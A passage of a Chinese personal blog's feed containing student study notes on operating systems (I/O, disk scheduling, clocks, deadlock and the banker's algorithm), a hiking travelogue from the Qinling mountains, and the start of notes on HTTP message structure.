src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/DISK%20FORMAT.png" alt=""></p><ol><li>无交错, 每个扇区顺序排列</li><li>单交错</li><li>双交错</li></ol><p><em>(以上了解)</em></p><h3 id="磁盘臂调度算法⭐"><a href="#磁盘臂调度算法⭐" class="headerlink" title="磁盘臂调度算法⭐"></a>磁盘臂调度算法⭐</h3><p>磁盘在读写过程种有三个时间决定: </p><ul><li><p>寻道时间Seek Time </p><p>将磁盘臂移动到适当的柱面上需要的时间</p></li><li><p>旋转延迟Rotational delay</p><p>等待适当的扇区旋转到磁头下的时间</p></li><li><p>数据传输时间Actual data trasfer time.</p><p>相比前面两个来说非常小</p></li></ul><p>传输时间相对忽略不计, 旋转延迟由机械决定, 讨论寻道时间</p><h4 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h4><p>按照柱面访问顺序进行访问. </p><h4 id="Shortest-Seek-Frist-最近柱面优先"><a href="#Shortest-Seek-Frist-最近柱面优先" class="headerlink" title="Shortest Seek Frist 最近柱面优先"></a>Shortest Seek Frist 最近柱面优先</h4><p>每次都访问离当前最近的</p><h4 id="The-elevator-algorithm-电梯调度"><a href="#The-elevator-algorithm-电梯调度" class="headerlink" title="The elevator algorithm 电梯调度"></a>The elevator algorithm 电梯调度</h4><p>每次都从头到尾,再从尾到头</p><h2 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h2><p>作用⭐</p><ol><li><p>Maintaining the time of day  维持一天中的时间。 </p></li><li><p>Preventing pro running longer  防止进程运行超出允许的时间</p><p>在启动进程时设定一个计数器, 每个时钟中断处将计数器—, When it gets to zero, the clock driver calls the scheduler to set up another process.</p></li><li><p>Accounting for CPU usage  计算CPU使用率</p><p>每当启动进程时，启动一个不同于主系统计时器的第二个计时器。当该过程停止时，可以读出计时器以告知该过程已运行了多长时间。</p></li><li><p>Handling the alarm system call  处理用户进程发出的警报系统调用</p></li><li><p>Providing watchdog timers  为系统本身的各个部分提供监视定时器</p><p>例如: 在一定时间间隔内未确认的数据包必须重新发送</p></li></ol><p><em><u>其他了解即可</u></em></p><h2 id="Network-terminals-网络终端"><a href="#Network-terminals-网络终端" class="headerlink" title="Network terminals                    网络终端"></a>Network terminals                    网络终端</h2><h3 id="两类终端"><a href="#两类终端" class="headerlink" title="两类终端"></a>两类终端</h3><ul><li><p>胖终端  X Windows</p><p>终端具有大量的计算能力和内存，以便运行复杂的协议来压缩通过网络发送的数据量。 </p></li><li><p>瘦终端 SLIM</p><p>终端非常简单，基本上是显示像素，并且为了使其便宜而没有做太多的复杂设计</p></li></ul><p><em><u>其他了解即可</u></em></p><hr><p><strong>操作系统系列</strong></p><ol><li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li><li>操作系统之IO管理  (本文)</li><li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章将涉及: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;IO设备&lt;/li&gt;
&lt;li&gt;盘&lt;/li&gt;
&lt;li&gt;时钟&lt;/li&gt;
&lt;li&gt;其他&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;em&gt;本文匆匆赶制, 内容粗糙简陋  &lt;del&gt;背就完事了&lt;/del&gt;&lt;/em&gt; &lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>山与水-漫步秦岭之子午古道</title>
    <link href="http://yoursite.com/2020/08/05/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E5%AD%90%E5%8D%88%E5%8F%A4%E9%81%93/"/>
    <id>http://yoursite.com/2020/08/05/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E5%AD%90%E5%8D%88%E5%8F%A4%E9%81%93/</id>
    <published>2020-08-05T03:08:22.000Z</published>
    <updated>2020-08-05T04:27:28.427Z</updated>
    
    <content type="html"><![CDATA[<p>2020年8月2日    海拔1564</p><p>子午古道: 拐儿崖-金仙观-土地梁-尖山 (原路返回)</p><a id="more"></a><p>正儿八经的第一篇徒步记录. 其实是第二次徒步了, 上一篇见2020-07-2的周记. 前两天斥资五百大洋购买了正经装备, 拿这次热热身😄</p><p>学校还在因为疫情继续封闭, 大清早通过某种不可言说的手段溜了出来, 自行打车前往峪口. (大清早在省体集合真的对郊区不友好啊) 打车钱都快赶上参团费用了😭. 约八点二十抵达子午口保护总站, 大部队还没来. 琢磨了下子午峪的简介, 不感冒的看官可跳过~</p><blockquote><p>秦岭七十二峪之一，位于陕西省西安市境内。峪长六百六十里，北口曰子，在西安府南百里；南口曰午，在汉中府洋县东一百六十里。</p><p>子午古道始于战国，范睢相秦“栈道千里，通于蜀汉”，使天下畏秦。“子午”之名谢于西汉，西汉修建.长安城时中轴线其南端起于子午谷口。</p><p>子午至唐代变是通畅，巴蜀荔枝由此道直送长安，故又称荔枝道。该递在朝晚期左宗梁任扶甘总替时全线整修，现谷口的石拱桥即为当时所修。</p><p>——- 选自入口处石碑</p></blockquote><p>确实是从西安城里的子午大道正南方. <strong>“一骑红尘妃子笑，无人知是荔枝来”</strong>.自四川涪州置专驿直通长安。每年“飞骑驰进，七日七夜至京，人马多毙于路，百姓苦之”.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BF%9D%E6%8A%A4%E7%AB%99.jpg" alt=""></p><p>入山需要刷身份证, 各位别忘了! 先乘摆渡车至金仙观, 领队带着简单热身之后便开始徒步, 最初一公里依旧是观光道, 虽有坡度但不算难走, 行走约一公里抵达第一个休息点(七里坪村) , 经人家, 过小河, 正式进入山道, 攀升二百余米, 抵达休息点二, 期间一路伴水, 两侧环山, 山泉潺潺, 草木环绕. 昨夜的夜雨夹杂着晨雾带来的露水打湿着蛛网与衣角, 倘若登山杖不小心打在什么树枝丫上, 水滴更是直直簌簌地落在身上, 引起同行者一片惊叫. 烦心的是山路混合着宿雨, 有几处略有湿滑. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E6%99%A8%E9%9C%B2.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E5%B1%B1%E8%B7%AF.jpg" alt=""></p><p>从休息点二继续沿着山路行走, 不多时见着土地梁, 其实是路边一个小土地庙, 同行有人还去拜了拜, 这时领队芃芃喊我们看路边的小野瓜, 大家稍作休整,这才进入更陡峭的野道.此时已经约中午十一点, 日出而林霏开, 同行的小姐姐们发现路边的野蘑菇忽地冒了出来, 在大家不经意间身边就多了好些或白或黄的小蘑菇(当然我们也没作死去挑战), 值得一说的是, 我们下山再次路过它们的时候发现它们已经完全张开了, 此间对比的惊奇非亲历者不可察. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E8%98%91%E8%8F%87.jpg" alt=""></p><p>一路攀登, 不少陡峭湿滑的路段大家互相帮助着都过来了. 到海拔1350左右的最后一个休息区. 领队瑞子说就在这里午餐休整, 想登顶的可以继续. 那我们肯定是继续冲呀哈哈. 最后这段山路我依旧打头, 比较难走, 两旁丛林茂密, 脚下山路难以辨认, 常常有巨石横于路中, 非得手脚并用才可以爬过去, 好在一路上不断有前人留下的引路标, 有时爬累了抬头看看不远处的尖山顶, 互相鼓励说就一点了, 已经望见山顶了 . 最后这两百米硬是爬了一个小时. 终于登顶! </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E5%B2%A9%E7%9F%B3.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E7%99%BB%E9%A1%B6.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E5%90%88%E7%85%A7.jpg" alt=""></p><p>不巧是此时山顶依旧云里雾里, 只能模糊看见近处山体. 返回休息区的路上云雾散去, 芃芃帮着大家拍了好些照片, 大感谢. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BA%91%E6%B5%B71.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BA%91%E6%B5%B72.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BA%91%E6%B5%B73.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E7%85%A7%E7%89%87.jpg" alt=""></p><p>回到休息区, 领队带着食材整了个火锅. (山上一把火真的大丈夫?) 丸子火腿方便面真香. 还有同行的小姐姐前一天准备了好多吃的, 鸭脖鸡翅蛋挞水果…相比之下我是个蹭吃蹭喝的小废物😭</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E7%81%AB%E9%94%85.jpg" alt=""></p><p>大家还惊奇地发现不知道从哪儿冒出了一直贼乖巧的猫, 一直绕着你脚边伸懒腰———而且太乖巧好看以至于大家一致认为这不是野猫, 那怎么会有游客带着猫爬山呢? 还是说是附近农家养的猫, 已经习惯来找游客骗吃骗喝? 被骗的心甘情愿www</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E6%92%B8%E7%8C%AB.jpg" alt=""></p><p>小憩半小时, 原路返回. </p><p>回去路上发现原来大巴是过大学城的!!!!!! 那我直接在大学城等车不就好了为什么直接打车到峪口!!!! 贵死了都!!!!</p><p>写于 2020年8月5日</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E8%AE%B0%E5%BD%95.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年8月2日    海拔1564&lt;/p&gt;
&lt;p&gt;子午古道: 拐儿崖-金仙观-土地梁-尖山 (原路返回)&lt;/p&gt;
    
    </summary>
    
    
      <category term="山与水" scheme="http://yoursite.com/categories/%E5%B1%B1%E4%B8%8E%E6%B0%B4/"/>
    
      <category term="不积硅步" scheme="http://yoursite.com/categories/%E5%B1%B1%E4%B8%8E%E6%B0%B4/%E4%B8%8D%E7%A7%AF%E7%A1%85%E6%AD%A5/"/>
    
    
      <category term="游记" scheme="http://yoursite.com/tags/%E6%B8%B8%E8%AE%B0/"/>
    
      <category term="漫步秦岭" scheme="http://yoursite.com/tags/%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之死锁</title>
    <link href="http://yoursite.com/2020/08/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%AD%BB%E9%94%81/"/>
    <id>http://yoursite.com/2020/08/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%AD%BB%E9%94%81/</id>
    <published>2020-08-04T11:23:09.000Z</published>
    <updated>2020-08-15T11:06:21.777Z</updated>
    
    <content type="html"><![CDATA[<p>本章包括以下内容:</p><ol><li>资源与死锁</li><li>处理死锁<ol><li>冷处理: 鸵鸟算法</li><li>热处理: 死锁的检测与恢复</li></ol></li><li>防范死锁<ol><li>避免死锁</li><li>死锁预防</li></ol></li><li>其他策略</li></ol><a id="more"></a><h2 id="资源与死锁"><a href="#资源与死锁" class="headerlink" title="资源与死锁"></a>资源与死锁</h2><h3 id="资源定义与分类"><a href="#资源定义与分类" class="headerlink" title="资源定义与分类"></a>资源定义与分类</h3><p>计算机中具有 <strong>排他性使用</strong> 的对象称为 <strong><u>资源</u></strong> . (即每次只允许一个进程访问). 资源可以是硬件(设备)或软件(信息). 资源随着时间推移必须能<u>获得, 使用, 以及释放</u>.</p><ul><li>可抢占式资源: B进程可以将资源R从进程A出抢占<strong>而不会产生任何副作用</strong>. 例如储存器.</li><li>不可抢占式资源: 在不引起相关失败的情况下, 无法将资源从占有它的进程处抢占过来.例如打印机.</li></ul><p><u>死锁仅可能出现在不可抢占式资源上.</u></p><p>资源的使用流程:</p><ol><li>申请资源</li><li>使用资源</li><li>释放资源</li></ol><p><em>当资源申请失败时,不同系统会采取不同反应: 阻塞申请(等待唤醒) 或 返回错误 (用户决定)</em> </p><h3 id="死锁定义"><a href="#死锁定义" class="headerlink" title="死锁定义"></a>死锁定义</h3><blockquote><p>如果一个进程集合中的每个进程都在等待只能由该进程集合中的其他进程才能引发的事件, 那么称这个进程集合的 <strong><u>死锁</u></strong> 的.</p><p><em>A set of processes is deadlocked if each process in the set is waiting for an event that only another process in the set can cause</em> </p></blockquote><p><del>显然这个定义太正经了大家都知道死锁是什么.</del></p><p>当发生死锁时, 任何一个进程都无法: 运行 / 释放资源 / 被唤醒</p><h3 id="死锁的四个必要条件⭐"><a href="#死锁的四个必要条件⭐" class="headerlink" title="死锁的四个必要条件⭐"></a>死锁的四个必要条件⭐</h3><ul><li><p>互斥条件 <strong>Mutual exclusion</strong> condition</p><p>每个资源要么被分给了一个进程, 要么是可用的</p></li><li><p>占有并等待  <strong>Hold and wait</strong> condition </p><p>进程可以在占有资源A的同时等待资源B的分配</p></li><li><p>不可抢占  <strong>No preemption</strong> condition </p><p>已经被分配的资源不可抢占, 只能等待占有它的进程主动释放</p></li><li><p>环路等待  <strong>Circular wait</strong> condition</p><p>系统中有多于一个的进程, 每个进程都在等待下一个进程占有的资源</p></li></ul><p><u>死锁发生时四个条件必须同时满足, 只要使任一条件不被满足即可预防死锁.</u></p><h3 id="死锁建模"><a href="#死锁建模" class="headerlink" title="死锁建模"></a>死锁建模</h3><p>圆形表示进程; 方形表示资源; </p><p>资源指向进程: 该资源已被进程占用;</p><p>进程指向资源: 该进程正在等待资源;</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E6%AD%BB%E9%94%81%E5%BB%BA%E6%A8%A1.png" alt=""></p><p>例如, 上图中进程C在等待被进程D占有的资源T, 进程D在等待被进程C占有的资源U.</p><p><em>如果模型中有闭合有向环, 表明存在死锁.</em></p><hr><h2 id="处理死锁⭐"><a href="#处理死锁⭐" class="headerlink" title="处理死锁⭐"></a>处理死锁⭐</h2><h3 id="冷处理-鸵鸟算法"><a href="#冷处理-鸵鸟算法" class="headerlink" title="冷处理: 鸵鸟算法"></a>冷处理: 鸵鸟算法</h3><p>假装没有问题, 如果进程执行时间过长就重启一下…</p><p>这是由于死锁的产生是取决于进程执行的精确时序, 在同一进程集合的多次运行中可能死锁的出现是非常偶然的; 此外处理死锁的开销往往非常高昂.</p><p>实际中本算法效果较好</p><h3 id="热处理-检测并恢复"><a href="#热处理-检测并恢复" class="headerlink" title="热处理: 检测并恢复"></a>热处理: 检测并恢复</h3><p>系统并不会防范死锁的产生, 而是在死锁发生之后再进行死锁的检测与恢复.</p><h4 id="死锁的检测"><a href="#死锁的检测" class="headerlink" title="死锁的检测"></a>死锁的检测</h4><p><strong>DFS算法</strong>: (了解)</p><p>依次将每一个节点作为一棵树的根节点, 并进行深度优先搜索, 如果再次遇到该节点表明找到了环.</p><p><strong>剪枝算法</strong>: </p><p>如果某进程只申请不占有, 将该节点剪去;如果某资源只被占有不被申请, 将该节点剪去;重复这两步直到无法剪去, 存在环.</p><p><strong>矩阵检测</strong>: (了解)</p><p>E 矩阵: 所有资源的总数; A矩阵: 所有资源当前空余量;</p><p>C矩阵: $C_{ij}$ 表示进程 $ i $  当前使用资源 $j$ 的数目;</p><p>R矩阵: $R_{ij}$ 表示进程 $ i $  当前需要资源 $j$ 的数目;</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E7%9F%A9%E9%98%B5%E6%A3%80%E6%B5%8B.png" alt=""></p><p>必定存在以下公式:</p><script type="math/tex; mode=display">\sum^n_{i=1}C_{ij} +A_j=E_j</script><p>如果当前的A矩阵可以使R矩阵按照一定顺序退出, 说明未形成死锁.</p><p>但死锁检测本身即浪费时间, 又需要定期检测, 所以热处理本身效果不佳.</p><h4 id="死锁的恢复"><a href="#死锁的恢复" class="headerlink" title="死锁的恢复"></a>死锁的恢复</h4><ul><li><p>资源抢占</p><p>将资源强制抢占(例如人工干预)</p></li><li><p>状态回滚</p><p>从之前某个状态重新加载, 重新跑未必发生死锁</p></li><li><p>杀死进程</p><p>杀死一个或若干个进程, 直到打破死锁.</p></li></ul><hr><h2 id="防范死锁⭐"><a href="#防范死锁⭐" class="headerlink" title="防范死锁⭐"></a>防范死锁⭐</h2><h3 id="避免死锁"><a href="#避免死锁" class="headerlink" title="避免死锁"></a>避免死锁</h3><h4 id="资源轨迹图"><a href="#资源轨迹图" class="headerlink" title="资源轨迹图"></a>资源轨迹图</h4><p>当走向轨迹穿越阴影重叠区时<strong>有可能</strong>发生死锁. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E8%B5%84%E6%BA%90%E5%9B%BE.png" alt=""></p><h4 id="安全态"><a href="#安全态" class="headerlink" title="安全态"></a>安全态</h4><p>安全态: 如果没有死锁发生,即使所有进程突然请求最大的资源需求, 也存在某种调度次序使得每一个进程都运行完毕.</p><p>不安全态: 如果没有死锁发生,若所有进程突然请求最大的资源需求, 不存在某种调度次序使得每一个进程都运行完毕.</p><p><u>注意: 不安全态不代表一定发生死锁, 但死锁发生一定经过不安全态.</u></p><h4 id="银行家算法"><a href="#银行家算法" class="headerlink" title="银行家算法"></a>银行家算法</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/04/%E9%93%B6%E8%A1%8C%E5%AE%B6.png" alt=""></p><p>如果A向量能够使用某种次序分配能够使所有进程安全退出就处于安全状态;</p><p>如果一直使其处于安全状态则可以避免死锁.</p><blockquote><p>实际上银行家算法缺少使用价值, 很少有进程在运行前知道需要多少资源, 而且进程数也在随时变化(新任务产生), 而且资源的状态也随时可能变化(例如打印机坏了).</p></blockquote><h3 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h3><p>从理论上完全避免死锁的不可能的(因为需要获知未来的请求) , 但是我们可以通过对死锁的四个必要条件的破坏来预防死锁的产生.</p><p><del>其实我觉得预防和避免这种文字游戏没啥意义,但是确实不知道怎么区分</del></p><h4 id="破坏互斥条件"><a href="#破坏互斥条件" class="headerlink" title="破坏互斥条件"></a>破坏互斥条件</h4><p>如果资源不被一个进程独占, 则不会产生死锁. </p><p>具体做法是将打印机使用假脱机, 即IO输出实际上是将文件发送至打印机的磁盘中, 再由打印机的控制程序慢慢打印磁盘的内容. 而多个进程可以同时对磁盘输出, 破坏了互斥条件.</p><p>但如果在某些情况下磁盘本身成为了互斥的资源, 这种方法就失效了</p><h4 id="破坏占有并等待"><a href="#破坏占有并等待" class="headerlink" title="破坏占有并等待"></a>破坏占有并等待</h4><p>禁止已持有资源的进程再申请其他资源.</p><p>一种实现方式是在进程开始时申请好全部资源. 但是这是无法实现的 (如果能实现为什么不用银行家呢?) 此外一次性分配资源也是巨大的浪费.</p><p>另一种实现方式是在申请新资源的时候先释放本来占有的资源. 但是开销大也不佳.</p><h4 id="破坏不可抢占条件"><a href="#破坏不可抢占条件" class="headerlink" title="破坏不可抢占条件"></a>破坏不可抢占条件</h4><p>通过将资源(主要指硬件设备)虚拟化可以使其能够抢占. 但是并不是所有资源都能够虚拟化的. 而且消除了打印机的死锁也可能带来硬盘的死锁.</p><h4 id="破坏环路等待条件"><a href="#破坏环路等待条件" class="headerlink" title="破坏环路等待条件"></a>破坏环路等待条件</h4><p>一种实现方式是每次只允许占据一个资源, 但是这显然不能接受的.</p><p>另一种方式是对所有资源进行编号, 某进程每次请求的资源不能是比自己占有的资源序号低的资源. 这样资源分配图中肯定不会出现环 (而是一条链).这种方式也几乎不能找到一个令人满意的编号次序.</p><hr><h2 id="其他策略"><a href="#其他策略" class="headerlink" title="其他策略"></a>其他策略</h2><ul><li>Two-Phase Locking</li><li>Non-resource Deadlocks</li><li>Starvation</li><li>….</li></ul><hr><p><strong>操作系统系列</strong></p><ol><li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a> (本文)</li><li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章包括以下内容:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;资源与死锁&lt;/li&gt;
&lt;li&gt;处理死锁&lt;ol&gt;
&lt;li&gt;冷处理: 鸵鸟算法&lt;/li&gt;
&lt;li&gt;热处理: 死锁的检测与恢复&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;防范死锁&lt;ol&gt;
&lt;li&gt;避免死锁&lt;/li&gt;
&lt;li&gt;死锁预防&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;其他策略&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>初窥HTTP之二_HTTP报文</title>
    <link href="http://yoursite.com/2020/08/03/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%BA%8C-HTTP%E6%8A%A5%E6%96%87/"/>
    <id>http://yoursite.com/2020/08/03/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%BA%8C-HTTP%E6%8A%A5%E6%96%87/</id>
    <published>2020-08-03T01:00:15.000Z</published>
    <updated>2020-08-03T02:38:19.768Z</updated>
    
    <content type="html"><![CDATA[<p>HTTP 报文的信息 </p><p>HTTP 状态码</p><p>HTTP 首部(待完成)</p><a id="more"></a><h2 id="HTTP-报文的信息"><a href="#HTTP-报文的信息" class="headerlink" title="HTTP 报文的信息"></a>HTTP 报文的信息</h2><p>本段将介绍HTTP报文中包括有那些信息.包括:</p><ol><li>报文的结构</li><li>报文编码</li><li>多部分对象集合</li><li>范围传输</li><li>内容协商</li></ol><h3 id="报文结构"><a href="#报文结构" class="headerlink" title="报文结构"></a>报文结构</h3><p>HTTP报文是由多行数据构成的, 每行之间使用<code>CR+LF</code>(\r\n) 进行换行.</p><p>报文可被分为报文首部与报文主体, 后者并不是必须的.</p><p>报文首部包括:</p><ul><li>请求行 / 状态行</li><li>请求首部字段 / 响应首部字段</li><li>通用首部字段</li><li>实体首部字段</li><li>其他</li></ul><p><strong>请求行</strong></p><p>包括请求的方法, 请求URI, HTTP版本</p><p><strong>状态行</strong></p><p>包括响应的结果状态码, 原因短语, HTTP版本</p><p><strong>首部字段</strong></p><p>包括表示各种条件和属性的各类首部语句. 分为四种: </p><ol><li>请求首部字段(仅在请求报文中出现); </li><li>响应首部字段(仅在响应报文中出现); </li><li>通用首部字段; </li><li>实体首部字段;</li></ol><p><strong>其他</strong></p><p>其他未在RFC中定义的字段, 如Cookie</p><h3 id="报文编码"><a href="#报文编码" class="headerlink" title="报文编码"></a>报文编码</h3><p>对传输的数据进行编码可以提高传输速率, 但是编码与解码会消耗CPU资源.</p><h4 id="报文主体与实体主体"><a href="#报文主体与实体主体" class="headerlink" title="报文主体与实体主体"></a>报文主体与实体主体</h4><p>报文是HTTP实际传输的字节流. 报文包括报文首部与报文主体.(报文主体可以是0个或1个)</p><p>实体是作为请求或响应的有效载荷数据. 由实体首部与实体主体组成.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(没有报文主体)</span><br><span class="line">没有实体</span><br><span class="line">if(有报文主体)</span><br><span class="line">if(有1个实体)</span><br><span class="line">if(实体未被处理)&#x2F;&#x2F;处理指: 传输中进行编码操作</span><br><span class="line">无实体首部</span><br><span class="line">实体主体&#x3D;&#x3D;报文主体</span><br><span class="line">if(实体被处理)</span><br><span class="line">有实体首部</span><br><span class="line">实体主体!&#x3D;报文主体</span><br><span class="line">if(有多个实体)</span><br><span class="line">有实体首部</span><br><span class="line">实体主体!&#x3D;报文主体</span><br></pre></td></tr></table></figure><p>个人理解,不一定对.</p><p><a href="https://www.zhihu.com/question/263752229" target="_blank" rel="noopener">知乎:http报文和实体的差别？</a></p><h4 id="压缩传输"><a href="#压缩传输" class="headerlink" title="压缩传输"></a>压缩传输</h4><p>将实体内容通过编码进行压缩, 常见的内容编码有:</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identify (不进行编码)</li></ul><h3 id="分割传输"><a href="#分割传输" class="headerlink" title="分割传输"></a>分割传输</h3><p>将大容量的数据分割传输, 让浏览器逐步显示页面, 称作 <strong>分块传输编码</strong>(Chunked Transfer Coding).</p><p>实体被分割成的多个部分使用一个十六进制来标记块的大小. </p><h3 id="多部份对象集合"><a href="#多部份对象集合" class="headerlink" title="多部份对象集合"></a>多部份对象集合</h3><p><a href="https://en.wikipedia.org/wiki/MIME" target="_blank" rel="noopener"><em>Wiki:MIME</em></a></p><p>多功能Internet邮件扩展（MIME）是一种Internet标准，以支持除ASCII以外的字符集以及音频，视频，图像和应用程序附件的文本.</p><p>MIME使用了Multipart 的方法来容纳多种不同类型的数据, 这个方法也被HTTP 采纳.</p><ul><li><p>multipart/form-data</p><p>这是在Web上传表单时使用</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: 